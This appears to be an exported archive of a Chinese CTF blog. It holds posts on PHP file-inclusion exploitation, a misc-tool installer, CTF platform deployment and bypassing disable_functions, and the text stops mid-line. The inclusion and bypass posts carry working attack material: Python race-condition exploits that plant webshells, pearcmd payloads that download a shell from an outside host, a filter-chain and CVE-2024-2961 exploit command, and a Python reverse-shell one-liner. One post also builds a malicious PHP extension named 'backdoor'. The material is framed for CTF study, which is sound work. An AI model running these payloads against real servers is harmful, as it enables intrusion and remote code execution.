%(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script    LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+31]    except ValueError:        return None    s2.send(lfireq % (fn, host))    d = s2.recv(4096)    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                if x:                    print &quot;\nGot it! Shell created in /tmp/g&quot;                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)    d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i        if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)    print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():    print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)    poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,    reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()    print &quot;Shuttin&#x27; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()


php7.0文件包含崩溃卡临时文件
上面所说的临时文件包含是在脚本运行结束之前进行利用，而下面的方法则是在脚本运行结束之后利用

7.0线程崩溃payload
php://filter/string.strip_tags/resource=/etc/passwd

上传表单的时候让php崩溃，从而保留下临时文件因为php是多线程的，所以单个线程的崩溃不会影响整个程序
import requestsurl = &quot;https://eae07757-1a87-40c5-955d-58ec51004989.challenge.ctf.show/?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;data = [    (&#x27;file&#x27;, (&#x27;a.php&#x27;, &quot;@&lt;?php\r\neval(\x24_POST[&#x27;a&#x27;]);\r\necho 123;\r\n?&gt;&quot;, &#x27;application/octet-stream&#x27;))]requests.post(url, files=data)


session.upload_progress文件包含会话机制(session)在PHP中用于保持用户连续访问Web应用时的相关数据。
PHP将session以文件的形式存储在服务器某个文件中，可以在php.ini里面设置session的存储位置session.save_path
默认路径
/var/lib/php/sess_PHPSESSID/var/lib/php/sessions/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID


再看下在php.ini中关于session和upload_progress的几个默认配置
session.upload_progress.enabled = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.upload_progress.freq = &quot;1%&quot;session.upload_progress.min_freq = &quot;1&quot;session.use_strict_mode = &quot;0&quot;



enabled&#x3D;on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中；cleanup&#x3D;on表示当文件上传结束后，php将会立即清空对应session文件中的内容；name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；prefix+name将表示为session中的键名;

其中session.use_strict_mode默认值为0，此时用户是可以自己定义Session ID的，比如在Cookie里设置PHPSESSID=lewiserii，PHP将会在服务器上创建一个文件：/tmp/sess_lewiserii
然后在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马，这样就会往指定的session文件中写入我们想要的内容

然后?file=/tmp/sess_lewiserii包含即可
但是要注意session.upload_progress.cleanup默认是开启的，一旦读取了所有POST数据，它就会清空对应session文件中的内容，所以需要利用条件竞争来包含
使用bp同时不断的发post传文件的包和文件包含的包或者使用脚本
import ioimport sysimport requestsimport threadingsessid = &#x27;ctf&#x27;sess_path=&#x27;/tmp&#x27;url=&#x27;http://c0648e39-a4bb-4776-88f0-a5cf98e9f640.challenge.ctf.show/&#x27;cmd=&#x27;ls /&#x27;def WRITE(session):    while True:        f = io.BytesIO(b&#x27;x&#x27; * 1024 * 50)        session.post(            url=url,            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:f&quot;&lt;?php system(&#x27;&#123;cmd&#125;&#x27;);?&gt;&quot;&#125;,            files=&#123;&quot;file&quot;:(&#x27;xxx.txt&#x27;, f)&#125;,            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;        )def READ(session):    while True:        response = session.get(f&#x27;&#123;url&#125;?file=&#123;sess_path&#125;/sess_&#123;sessid&#125;&#x27;)        if &#x27;upload_progress_&#x27; in response.text:            print(response.text)            sys.exit(0)        else:            print(&#x27;++++++retry++++++&#x27;)def main():    with requests.session() as session:        t1 = threading.Thread(target=WRITE, args=(session,))        t1.daemon = True        t1.start()        READ(session)if __name__ == &#x27;__main__&#x27;:    main()



pear文件包含利用条件1：有文件包含点2：开启了pear扩展3：配置文件中register_argc_argv设置为On，而默认为Off

PEAR是为PHP扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库，类似于composer，用于代码的下载与管理。默认安装位置：/usr/local/lib/php

那么这个register_argc_argv能干什么呢？简言之，可以通过$_SERVER[&#39;argv&#39;]获得命令行参数，其中以+作为分隔符

在pear目录下有一个pearcmd.php，是pear命令调用的文件，是用来管理依赖的，类似python的pip。能包含它又能给参数的话，就可以用它来写木马了
靶机可出网远程文件下载
命令行语法：pear install -R /tmp http://vps/shell.php
用install会下载到/tmp/pear/download/目录下，当然也可以用-R指定目录。而用download会下载到当前目录
/?file=/usr/local/lib/php/pearcmd.php&amp;+install+http://your-shell.com/shell.php/?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/var/www/html/+http://your-shell.com/shell.php/?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://your-shell.com/shell.php

靶机不出网姿势一：通过config-create写shell
/?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/&lt;?=eval($_POST[a])?&gt;+/tmp/shell.php/?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[a]`;?&gt;+1.php


姿势二：将恶意的php代码写入配置文件中
/?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+


绕过包含次数限制例题
&lt;?phprequire_once(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;content&#x27;])) &#123;    $content = $_GET[&#x27;content&#x27;];    require_once($content);&#125;

因为include_once，require_once对于同一个文件只能包含一次，已经包含了flag.php一次了，那么就没办法继续包含它了吗？
payload:php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
路径中的/proc/self/root就表示/
具体分析原理的文章：php源码分析 require_once 绕过不能重复包含文件的限制
FilterChain 利用 （iconv LFI）hxp CTF 2021 - The End Of LFI?
原理利用了PHP Base64 Filter 宽松的解析特性，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需临时文件的 RCE
//解码的字符串中包含无效字符，那么就会忽略掉那些字符，只对有效字符进行解码dr0n11       --&gt;  ZHIwbjExZH&lt;?Iw-bjEx  --&gt;  dr0n11

即使我们在使用其他字符编码时产生了不可见字符，也可以利用 convert.base64-decode 来去掉非法字符，留下我们想要的字符
利用因为不同的靶机环境有不同的字符集，所以可能会打不通，这时可以先fuzz一下，得到更为通用的字符集构造的POC
PHP_INCLUDE_TO_SHELL_CHAR_DICT
PHP filter chain generator
也可以用来绕过一些限定条件
例如
&lt;?php    error_reporting(0);    if (isset($_GET[&#x27;file&#x27;])) &#123;        $content = file_get_contents($_GET[&#x27;file&#x27;]);        if (strpos($content, &#x27;aaa&#x27;) === False) &#123;            die(&#x27;failed to read&#x27;);        &#125;        else &#123;            echo $content;            die();        &#125;    &#125;    else &#123;            die(&#x27;nothing here&#x27;);    &#125;?&gt;

python3 php_filter_chain_generator.py --chain &#39;aaa&#39;
绕过string.strip_tags过滤器和&lt;搭配使用
(PHP 4, PHP 5, PHP 7, PHP 8)strip_tags — 从字符串中去除 HTML 和 PHP 标签

当我们使用php_filter_chain_generator生成FilterChain的时候在结尾添加一个&lt;标签


在结尾手动添加一个string.strip_tags，过滤后面的乱字符

侧信道读取文件-基于错误的oracle方式（error-based-oracle）与 FilterChain 利用相似
限制条件：1：php 5.3 以下不能用2：极度依赖系统 iconv 提供的字符集
例子
//2024红明谷&lt;?phphighlight_file(__FILE__);// flag.phpif (isset($_POST[&#x27;f&#x27;])) &#123;    echo hash_file(&#x27;md5&#x27;, $_POST[&#x27;f&#x27;]);&#125;?&gt;

原理The End of AFR? 非常详细的解读了工作原理

使用 UCS-4LE 等编码技巧让 PHP 产生内存错误导致服务器产生 500 错误，配合 dechunk 编码使得前面的错误正常化从而获得一个盲注的判断依据，使用该依据以及编码技巧逐个判断盲注出文件内容，进而可以造成任意文件内容读取。

受影响的函数基本上只要对文件执行操作，包括读取、写入或向文件追加内容，或者使用了链接到该文件的流都会受到影响



Function
Pattern



file_get_contents
file_get_contents($_POST[0]);


readfile
readfile($_POST[0]);


finfo-&gt;file
$file &#x3D; new finfo(); $fileinfo &#x3D; $file-&gt;file($_POST[0], FILEINFO_MIME);


getimagesize
getimagesize($_POST[0]);


md5_file
md5_file($_POST[0]);


sha1_file
sha1_file($_POST[0]);


hash_file
hash_file(‘md5’, $_POST[0]);


file
file($_POST[0]);


parse_ini_file
parse_ini_file($_POST[0]);


copy
copy($_POST[0], ‘&#x2F;tmp&#x2F;test’);


file_put_contents (only target read only with this)
file_put_contents($_POST[0], “”);


stream_get_contents
$file &#x3D; fopen($_POST[0], “r”); stream_get_contents($file);


fgets
$file &#x3D; fopen($_POST[0], “r”); fgets($file);


fread
$file &#x3D; fopen($_POST[0], “r”); fread($file, 10000);


fgetc
$file &#x3D; fopen($_POST[0], “r”); fgetc($file);


fgetcsv
$file &#x3D; fopen($_POST[0], “r”); fgetcsv($file, 1000, “,”);


fpassthru
$file &#x3D; fopen($_POST[0], “r”); fpassthru($file);


fputs
$file &#x3D; fopen($_POST[0], “rw”); fputs($file, 0);


利用php_filter_chains_oracle_exploit
python3 filters_chain_oracle_exploit.py --target http://172.20.35.66/ --parameter 0 --file /flag

利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）原理GNU C 是一个标准的ISO C依赖库。在GNU C中，iconv()函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。
如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用iconv()的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。
利用同样的，PHP的所有标准文件读取操作都受到了影响：file_get_contents()、hash_file()、file()、readfile()、fgets()、getimagesize()、SplFileObject-&gt;read()等
cnext-exploits
python3 cnext-exploit.py http://your-ip:8080/index.php &quot;echo &#39;&lt;?=phpinfo();?&gt;&#39; &gt; shell.php&quot;
绕过手动修改脚本中的交互逻辑即可
伪协议去除多余字符例子
&lt;?phphighlight_file(__FILE__);$content=&#x27;lajilajilajilajilaji&#x27;.$_GET[&#x27;a&#x27;].&#x27;lajilajilajilajilaji&#x27;;file_put_contents($_GET[&#x27;name&#x27;].&quot;.txt&quot;,$content);$tmp = file_get_contents(&#x27;123.txt&#x27;);eval($tmp($_GET[&#x27;cmd&#x27;]));

原理还是基于base64的宽松性
所以只需要将垃圾字符转换成base64字符集以外的字符即可
&lt;?php$a =&#x27;system&#x27;;$payload = iconv(&#x27;utf-8&#x27;, &#x27;utf-16&#x27;, base64_encode($a));echo urlencode($payload);// 1：我们需要的数据// system// 2：base64后// c3lzdGVt// 3：utf-8转换为utf-16// %FF%FEc%003%00l%00z%00d%00G%00V%00t%00


&lt;?php$b=&#x27;lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji&#x27;;$b=urldecode($b);$payload = iconv(&#x27;utf-16&#x27;, &#x27;utf-8&#x27;, $b);$payload = base64_decode($payload);echo $payload;// 1：拼接后的数据// lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji// 2：utf-16转换为utf-8// 乱码c3lzdGVt乱码// 3：base64_decode// system

转成伪协议的写法
php://filter/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=
不同编码在线转换网站
php还有很多支持的字符编码
UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win*ISO-2022-JPISO-2022-JP-MSCP932CP51932SJIS-mac（别名：MacJapanese）SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）SJIS-Mobile#KDDI（别名：SJIS-KDDI）SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）UTF-8-Mobile#KDDI-AUTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）JISJIS-msCP50220CP50220rawCP50221CP50222ISO-8859-1*ISO-8859-2*ISO-8859-3*ISO-8859-4*ISO-8859-5*ISO-8859-6*ISO-8859-7*ISO-8859-8*ISO-8859-9*ISO-8859-10*ISO-8859-13*ISO-8859-14*ISO-8859-15*ISO-8859-16*byte2bebyte2lebyte4bebyte4leBASE64HTML-ENTITIES（别名：HTML）7bit8bitEUC-CN*CP936GB18030HZEUC-TW*CP950BIG-5*EUC-KR*UHC（别名：CP949）ISO-2022-KRWindows-1251（别名：CP1251）Windows-1252（别名：CP1252）CP866（别名：IBM866）KOI8-R*KOI8-U*ArmSCII-8（别名：ArmSCII8）





参考文章1：Docker PHP裸文件本地包含综述参考文章2：文件包含的几种不常规利用姿势参考文章3：PHP Filter链——基于oracle的文件读取攻击
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_misc_auto_deploy</title>
    <url>/posts/b9ea1bfd/</url>
    <content><![CDATA[CTF_misc_auto_deploy一个自动部署Misc工具的轻量sh脚本闲的无聊随便写的小玩意适合在新环境中快速搭建misc环境
项目地址
目前支持的功能1：换网络源，允许 root ssh登录2：安装docker3：安装docker-compose4：安装golang5：安装java6：安装 linux 下的部分 misc 工具和第三方脚本（我知道的），具体如下
binwalkbkcrackblindwatermarkcloacked-pixeldtmf2numdwarf2jsonexifextundeletef5-steganographyforemostgapsgnuplotminimodemmontageoutguesspycdcsstvsteghidestegosaurusstegpystegseekusb-mouse-pcap-visualizerusbkeyboarddatahackervolatility2volatility3webpwiresharkzsteg



支持的系统ubuntu16.04&#x2F;18.04&#x2F;20.04&#x2F;22.04
推荐 ubuntu20 加代理运行
使用本脚本可重复运行安装工具保存在运行脚本的misc_tools目录下
方法一：git clone https://github.com/dr0n1/CTF_misc_auto_deploychmod 777 auto_deploy.sh.&#x2F;auto_deploy.sh [mode]
usage: ./auto_deploy.sh [mode]        basics              基础配置(换源，vim，ssh)        docker              安装docker        docker-compoer      安装docker-compose        go                  安装golang        java                安装java        misc-tools          安装misc工具

方法二：bash &lt;(curl -s https://raw.githubusercontent.com/dr0n1/CTF_misc_auto_deploy/main/auto_deploy.sh) [mode]

更新日志V1.0: 第一代脚本V1.1: 增加 python 安装模块V1.2: 优化安装逻辑等V1.3：移除 python，新增 golang 和 javaV2.1：增加 CTF-Misc 部分工具的安装V2.2：优化可重复运行脚本逻辑V2.3：优化部分 python 模块安装逻辑V2.4：增加部分misc工具，格式化代码V3.1：移除了centos的工具支持，增加golang多版本支持等V3.2：修复了诺干bug，增加了java版本管理
后续计划1：计划增加 web 系列工具
有疑问或者有更好的建议请联系1930774374@qq.com
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>自动化</tag>
        <tag>自研工具</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf平台搭建与出题指南</title>
    <url>/posts/5ae46a89/</url>
    <content><![CDATA[ctf平台搭建目前最常见的平台是CTFd和GZCTF
CTFd使用帆哥的一键部署脚本（centos7和ubuntu20上测试成功）sh &lt;(curl -s https://raw.githubusercontent.com/pwnthebox/ctfd-auto-deploy/master/install.sh)

2024.5.13帆哥github被封了，重构&#x2F;优化了一下自动部署脚本
https://github.com/dr0n1/CTFd_auto_deploy
GZCTF
适合办比赛（样式也好看），不适合自用和训练

新建两个文件 appsettings.json 和 docker-compose.yml
&#123;  &quot;AllowedHosts&quot;: &quot;*&quot;,  &quot;ConnectionStrings&quot;: &#123;    &quot;Database&quot;: &quot;Host=db:5432;Database=gzctf;Username=postgres;Password=&lt;String1&gt;&quot;      //&lt;String1&gt;换成数据库密码，随机密码且长度足够  &#125;,  &quot;Logging&quot;: &#123;    &quot;LogLevel&quot;: &#123;      &quot;Default&quot;: &quot;Information&quot;,      &quot;Microsoft&quot;: &quot;Warning&quot;,      &quot;Microsoft.Hosting.Lifetime&quot;: &quot;Information&quot;    &#125;  &#125;,    //邮箱配置  &quot;EmailConfig&quot;: &#123;    &quot;SendMailAddress&quot;: &quot;Admin@xxx.com&quot;,		// 填入邮箱    &quot;UserName&quot;: &quot;ctf_noreply&quot;,				    // 发件人名称    &quot;Password&quot;: &quot;******&quot;,                 // 邮箱密码，部分服务商需要填入授权码    &quot;Smtp&quot;: &#123;      &quot;Host&quot;: &quot;smtp.163.com&quot;,				  // 此处为163邮箱服务器，具体自定      &quot;Port&quot;: 465    &#125;  &#125;,  &quot;XorKey&quot;: &quot;&lt;String2&gt;&quot;,					    // 自定XorKey  &quot;ContainerProvider&quot;: &#123;    &quot;Type&quot;: &quot;Docker&quot;,    &quot;PublicEntry&quot;: &quot;xx.xx.xx.xx&quot;,			// 域名或IP配置，用于容器生成,域名不带http/https    &quot;DockerConfig&quot;: &#123;      &quot;SwarmMode&quot;: false,      &quot;Uri&quot;: &quot;&quot;								        // 本地配置Docker因此此处置空    &#125;  &#125;,  &quot;RequestLogging&quot;: false,  &quot;DisableRateLimit&quot;: false,  &quot;RegistryConfig&quot;: &#123;    &quot;UserName&quot;: &quot;&quot;,    &quot;Password&quot;: &quot;&quot;,    &quot;ServerAddress&quot;: &quot;&quot;  &#125;,    //谷歌验证码配置  &quot;GoogleRecaptcha&quot;: &#123;    &quot;VerifyAPIAddress&quot;: &quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;,    &quot;Sitekey&quot;: &quot;&quot;,    &quot;Secretkey&quot;: &quot;&quot;,    &quot;RecaptchaThreshold&quot;: &quot;0.5&quot;  &#125;&#125;

version: &#x27;3.0&#x27;services:  gzctf:    image: gztime/gzctf:latest    restart: always    environment:      - &quot;GZCTF_ADMIN_PASSWORD=&lt;String3&gt;&quot; # &lt;String3&gt;换成管理员账户密码，账号为Admin    ports:      - &quot;80:8080&quot; # 对外端口号，前为外部端口。    networks:      default:    volumes:      - &quot;./data/files:/app/uploads&quot;      - &quot;./appsettings.json:/app/appsettings.json:ro&quot;      - &quot;./logs:/app/log&quot;      - &quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;      # - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot;      - &quot;/var/run/docker.sock:/var/run/docker.sock&quot;    depends_on:      - db  db:    image: postgres:alpine    restart: always    environment:      - &quot;POSTGRES_PASSWORD=&lt;String1&gt;&quot; # 数据库密码，务必要和appsettings.json中的配置一致    networks:      default:    volumes:      - &quot;./data/db:/var/lib/postgresql/data&quot;networks:  default:    driver: bridge    ipam:      config:        - subnet: 192.168.12.0/24


修改完配置文件后运行docker-compose up -d命令即可
注意密码的设置一定要符合复杂性要求，否则会报错
动态flag题目部署模板项目地址：https://github.com/dr0n1/CTF_Docker_Template
包含pwn系列的ubuntu16，ubuntu18，ubuntu20，ubuntu22web系列的php，java，python，go，mysqlmisc，reverse系列的部分动态
因为不会crypto，就没写交互的crypto
pwn题部署
包含了ubuntu16，ubuntu18，ubuntu20，ubuntu22四个基础模板

假设现在出了一道pwn题，名字是baby_stack
首先根据题目选择需要的Ubuntu版本，这里以Ubuntu16为例，下载pwn_ubuntu16这个模板
把出好的二进制文件放到bin目录下，替换test然后找到ctf.xinetd文件中的server_args值，修改test为附件名

第二步，构建镜像在Dockerfile所在的目录运行docker build -t &lt;镜像名&gt; .运行后可以用docker images查看下是否成功生成了镜像

第三步，本地测试或CTFd部署

本地测试这步可选，没有信心一次成功的话可以先在本地测试下

运行docker run -itd -p &lt;对外暴露端口&gt;:9999 &lt;镜像名&gt; /start.sh


nc连接后能返回程序的功能就ok了(别忘记删除容器)接着在CTFd上部署，注意type选择direct，image与port对应即可

web题部署php
包含了web_apache-mysql-php5.5，web_apache-mysql-php7.3，web_apache-php5.5，web_apache-php7.3 四个php模板。（如果需要其他版本的php环境，替换Dockerfile中的FROM命令即可）

1：将题目放入src目录下2：将需要导入数据库的数据写入data目录下的data.sql3：根据题目选择flag位置，然后修改start.sh4：docker build
在sql环境中注意替换flag位置即可（要一一对应）

如果需要使用php扩展，则修改或增加Dockerfile文件中的docker-php-ext-install命令即可
# 基于thinkphp等框架的源码则需要在start.sh中添加 更改网页根目录 的代码，并根据手册安装对应依赖和拓展# 仅供参考sed -i &#x27;s/DocumentRoot \/var\/www\/html/DocumentRoot \/var\/www\/html\/public/&#x27; /etc/apache2/sites-available/000-default.conf



python
包含了web_flask-python2.7，web_flask-python3.10 两个python模板

1：src中存放题目代码，注意命名app.py。如果使用了除flask外的第三方库，请在requirements.txt中标明2：默认启动时不启用debug模式，如需要启用debug模式请修改start.sh

misc题部署
包含了misc_python2.7，misc_python3.9两个镜像模板。利用http.server，SimpleHTTPServer和httpd启动一个web服务用来下载附件


个人认为动态misc的核心思路就是把出题过程转换为一个脚本，然后读取平台传递的flag后生成附件，利用web服务下载。所以部分工具题和复杂一点的题目是没有办法出动态的

还是先根据需求选择不同的环境，这里以misc_python3.9为例
第一步，先将出题思路写进一个脚本中，命名为challenges.py，所需的模块放到requirements.txt中
这个脚本有几点需要注意：1：需要从/flag读取flag值2：出题后生成的附件需要套一层压缩包以便访问自动下载，zip需要命名为attachment.zip3：尽量在脚本结束时删除无用的文件
以下是一个简单的例子
import randomimport pyminizipimport osfrom PIL import Image,ImageDraw,ImageOpsf=open(&#x27;/flag&#x27;)flag=f.read()a=Image.new(&quot;1&quot;,(300,20))w,h=a.sized=ImageDraw.Draw(a)d.text((0,0),flag,fill=255)a = ImageOps.invert(a)a.save(&#x27;1.png&#x27;)password = &#x27;&#x27;.join(random.choices(&#x27;0123456789&#x27;, k=8))pyminizip.compress(&quot;1.png&quot;, None, &quot;attachment.zip&quot;, password, 5)os.remove(&quot;1.png&quot;)


第二步，将代码放进files目录，然后生成镜像

第三步，在CTFd上部署，然后验证
部署时端口选择80
开启靶机后访问，如果没出问题的话应该只会弹出一个保存文件的窗口，且能成功下载

下载到本地后就可以正常解题
docker in qemu in docker常见于docker逃逸题目的部署docker（deploy）-&gt; qemu（flag）-&gt; docker（attack）
如果用了kvm则要注意kvm的映射
docker build -t docker-escaper .docker run -itd -p 5555:5555 --device /dev/kvm  -v /dev/kvm:/dev/kvm  docker-escaper

没有kvm的解决方法
# 检查cpu是否支持apt install cpu-checkkvm-ok# 如果支持则可以继续apt install qemu qemu-kvm libvirt-clients libvirt-daemon-system bridge-utils virt-manager libguestfs-toolssudo systemctl enable --now libvirtdsudo systemctl enable --now virtlogdecho 1 | sudo tee /sys/module/kvm/parameters/ignore_msrssudo modprobe kvm


总结一定要灵活使用dockerfile，不同题目根据需求做不同策略
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>平台搭建部署</tag>
        <tag>docker</tag>
        <tag>自动化</tag>
        <tag>自研工具</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过disable_functions的方法总结</title>
    <url>/posts/5f3ac2d3/</url>
    <content><![CDATA[常规函数函数绕过&lt;?php//exececho exec(&#x27;whoami&#x27;);//shell_exececho shell_exec(&#x27;whoami&#x27;);//systemsystem(&#x27;whoami&#x27;);//passthrupassthru(&quot;whoami&quot;);//popen$file = popen(&quot;whoami&quot;,&quot;r&quot;);pclose($file);//proc_open$command=&quot;whoami&quot;; $descriptorspec = array(1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)); $handle = proc_open($command ,$descriptorspec , $pipes); while(!feof($pipes[1])) &#123; echo fread($pipes[1], 1024);&#125;

如果安装了 pcntl 插件，则可以利用pcntl_exec来绕过
#exec.php&lt;?php pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/exp.sh&quot;));?&gt;#/tmp/exp.sh#!/bin/bashls -l /

或者与python结合来反弹shell
&lt;?php pcntl_exec(&quot;/usr/bin/python3&quot;,array(&#x27;-c&#x27;,&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;IP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));




使用ext_skel制作恶意php扩展disable_fuctions禁用的是php的函数，使用php扩展调用c的函数即可绕过
这种利用方式的条件较为苛刻
1：知道扩展目录并且目录可写（覆盖到已经引用的扩展，比如mysqli.so）2：能够载入php扩展（重启或者使用php命令行执行）3：能够调用自定义函数
例如
&lt;?phperror_reporting(0);$action = $_GET[&#x27;a&#x27;];switch ($action) &#123;    case &#x27;phpinfo&#x27;:        phpinfo();        break;    case &#x27;write&#x27;:        file_put_contents($_POST[&#x27;file&#x27;],$_POST[&#x27;content&#x27;]);        break;    case &#x27;run&#x27;:        shell_exec(&quot;php -r &#x27;ctfshow();&#x27;&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125;



ext_skel是php源码包里自带的一个开发生成工具

首先在PHP源码下的ext目录下执行
php ext_skel.php --ext backdoor --std
运行后会生成一个backdoor目录，然后修改生成的c文件的代码

在头部添加 stdlib.h ，例子中的23行
修改函数名，几处函数名要一致，例如37行和98行的函数名对应，这里用的是ctfshow
在自定义函数中添加system执行命令即可，例如40行

/*   +----------------------------------------------------------------------+   | PHP Version 7                                                        |   +----------------------------------------------------------------------+   | Copyright (c) The PHP Group                                          |   +----------------------------------------------------------------------+   | This source file is subject to version 3.01 of the PHP license,      |   | that is bundled with this package in the file LICENSE, and is        |   | available through the world-wide-web at the following url:           |   | http://www.php.net/license/3_01.txt                                  |   | If you did not receive a copy of the PHP license and are unable to   |   | obtain it through the world-wide-web, please send a note to          |   | license@php.net so we can mail you a copy immediately.               |   +----------------------------------------------------------------------+   | Author:  |   +----------------------------------------------------------------------+*/#ifdef HAVE_CONFIG_H# include &quot;config.h&quot;#endif#include &quot;stdlib.h&quot;#include &quot;php.h&quot;#include &quot;ext/standard/info.h&quot;#include &quot;php_backdoor.h&quot;/* For compatibility with older PHP versions */#ifndef ZEND_PARSE_PARAMETERS_NONE#define ZEND_PARSE_PARAMETERS_NONE() \        ZEND_PARSE_PARAMETERS_START(0, 0) \        ZEND_PARSE_PARAMETERS_END()#endif/* &#123;&#123;&#123; void backdoor_test1() */PHP_FUNCTION(ctfshow)&#123;        ZEND_PARSE_PARAMETERS_NONE();        system(&quot;curl 